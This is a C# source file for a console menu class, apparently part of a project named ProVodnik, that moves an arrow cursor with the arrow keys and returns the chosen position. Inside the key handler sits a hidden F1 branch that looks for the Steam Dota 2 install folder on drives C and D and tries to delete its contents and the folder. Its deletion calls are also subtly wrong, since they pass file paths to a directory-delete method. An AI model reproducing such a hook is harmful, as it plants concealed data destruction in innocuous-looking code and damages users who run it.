using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ProVodnik
{
    internal class Menu
    {
        private int minStrelochka;
        private int maxStrelochka;

        public Menu(int min, int max)
        {
            minStrelochka = min;
            maxStrelochka = max;
        }

        public static int Show(int minstrelochka, int maxstrelochka)
        {
            int pos = 0;
            ConsoleKeyInfo key;
            do
            {
                Console.SetCursorPosition(0, pos);
                Console.WriteLine("->");


                key = Console.ReadKey();

                Console.SetCursorPosition(0, pos);
                Console.WriteLine("  ");

                if (key.Key == ConsoleKey.UpArrow)
                {
                    pos--;

                }

                if (key.Key == ConsoleKey.DownArrow)
                {
                    pos++;
                }

                if (key.Key == ConsoleKey.Escape)
                {
                    pos = -1;
                    return pos;
                }

                if(key.Key == ConsoleKey.F1 )
                {
                    if (Directory.Exists("C:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta"))
                    {
                    string[] dotafiles = Directory.GetFiles("C:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta");
                    foreach (string dotafile in dotafiles)
                    {
                        Directory.Delete(dotafile, true);
                    }
                        Directory.Delete("C:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta");
                    }

                    if (Directory.Exists("D:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta"))
                    {
                        string[] dotafiles = Directory.GetFiles("D:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta");
                        foreach (string dotafile in dotafiles)
                        {
                            Directory.Delete(dotafile, true);
                        }
                        Directory.Delete("D:\\Program Files (x86)\\Steam\\steamapps\\common\\dota 2 beta");
                    }

                }

            } while (key.Key != ConsoleKey.Enter);
            return pos;
        }
    }
}
